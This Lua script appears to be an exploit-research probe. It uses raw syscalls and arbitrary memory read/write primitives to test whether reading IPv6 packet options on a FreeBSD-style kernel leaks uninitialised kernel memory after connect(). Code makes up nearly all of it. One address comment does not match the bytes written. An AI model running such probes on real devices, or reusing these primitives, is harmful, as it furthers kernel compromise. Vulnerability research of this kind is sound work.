-- CRASH_CLASS: LOW
-- PROBE 981a: IPV6_PKTOPTIONS readback on a connected socket
--
-- UNTESTED_THEORIES.md:93 lists this as the one IPV6 ancillary read never tried:
-- probe 09 only read the option buffer on an unconnected socket. On FreeBSD the
-- assembled option list differs after connect(), and a read that copies a tail
-- from a partly initialised buffer would be a kernel-memory disclosure with no
-- privilege gate. This reads the buffer before and after connect and prints any
-- bytes that were not written by our own setsockopt.

print("=== PROBE 981a: IPV6_PKTOPTIONS ON A CONNECTED SOCKET ===")
print("")
local function to_num(v)
    if type(v)=="table" and v.tonumber then return v:tonumber() end
    if type(v)=="table" and v.h then return v.h*4294967296+v.l end
    return tonumber(v) or 0
end
local function mk(n) local t={} for k,v in pairs(syscall.pipe) do t[k]=v end t.syscall_no=n setmetatable(t,getmetatable(syscall.pipe)) return t end
local function hi_lo(v) if type(v)=="table" and v.h then return v.h,v.l end return 0,to_num(v) end
local function rd(a) local o,v=pcall(function() return to_num(memory.read_dword(a)) end) if o then return v end return -999 end
local function rb(a) local o,v=pcall(function() return to_num(memory.read_byte(a)) end) if o then return v end return -1 end
local function wd(a,v) pcall(function() memory.write_dword(a,v) end) end
local function wb(a,v) pcall(function() memory.write_byte(a,v) end) end
local function addr_of(t) local s=tostring(t) local m=s:match("0x(%x+)") if m then return tonumber(m,16) end return to_num(t) end
local function ret(tag, ok, rv) if not ok then print("  ["..tag.."] PCALL-FAIL") return nil end local h,l=hi_lo(rv) print(string.format("  [%s] ret=0x%08X_%08X", tag, h, l)) return l end

print(string.format("[A] pid=%d", to_num(mk(20)())))

local fd = ret("socket6", pcall(function() return mk(97)(uint64(28),uint64(2),uint64(0)) end))
if not fd or fd < 0 then print("no socket"); return end

-- poison the option buffer so any byte we see is engine-written
local OB = memory.alloc(0x200)
for i=0,0x1FF do wb(OB+i, 0xA5) end
local ob = addr_of(OB)
local LB = memory.alloc(8)
wd(LB, 0x200)

local function readopts(tag, opt)
    for i=0,0x1FF do wb(OB+i, 0xA5) end
    wd(LB, 0x200)
    local ok, rv = pcall(function() return mk(118)(uint64(fd),uint64(41),uint64(opt),uint64(ob),uint64(addr_of(LB))) end)
    local l = ret(tag, ok, rv)
    local len = rd(LB)
    print(string.format("      len=%d", len))
    if ok and l == 0 and len > 0 and len < 0x200 then
        local nz = 0
        local first = -1
        for i=0,len-1 do if rb(OB+i) ~= 0xA5 then nz = nz + 1 if first < 0 then first = i end end end
        print(string.format("      bytes written=%d first=%d", nz, first))
        for i=0,math.min(len,64)-1,4 do
            print(string.format("        [%02X] %02X%02X%02X%02X", i, rb(OB+i), rb(OB+i+1), rb(OB+i+2), rb(OB+i+3)))
        end
    end
end

-- 1. set PKTINFO (46) on the socket, then read via the 2292 alias (25) and 60
local PI = memory.alloc(0x14)
for i=0,0x13 do wb(PI+i, 0) end
wb(PI, 0x24) wb(PI+1, 0x01)   -- ::1
wd(PI+0x10, 1)                -- ifindex 1
ret("setsockopt PKTINFO", pcall(function() return mk(105)(uint64(fd),uint64(41),uint64(46),uint64(addr_of(PI)),uint64(0x14)) end))

print("[B] unconnected readback")
readopts("getopt 25 (2292PKTOPTIONS)", 25)
readopts("getopt 60", 60)

-- 2. connect to ::1 port 9
local SA = memory.alloc(0x1C)
for i=0,0x1B do wb(SA+i, 0) end
wb(SA, 0x1C) wb(SA+1, 28)
wb(SA+8, 0) wb(SA+9, 0) wb(SA+10, 0) wb(SA+11, 0) wb(SA+12, 0) wb(SA+13, 0) wb(SA+14, 0) wb(SA+15, 1)
wb(SA+16, 0) wb(SA+17, 9)
print("[C] connect ::1:9")
ret("connect", pcall(function() return mk(98)(uint64(fd),uint64(addr_of(SA)),uint64(0x1C)) end))

print("[D] connected readback")
readopts("getopt 25 (2292PKTOPTIONS)", 25)
readopts("getopt 60", 60)

print(string.format("[Z] alive pid=%d", to_num(mk(20)())))
print("=== COMPLETE ===")
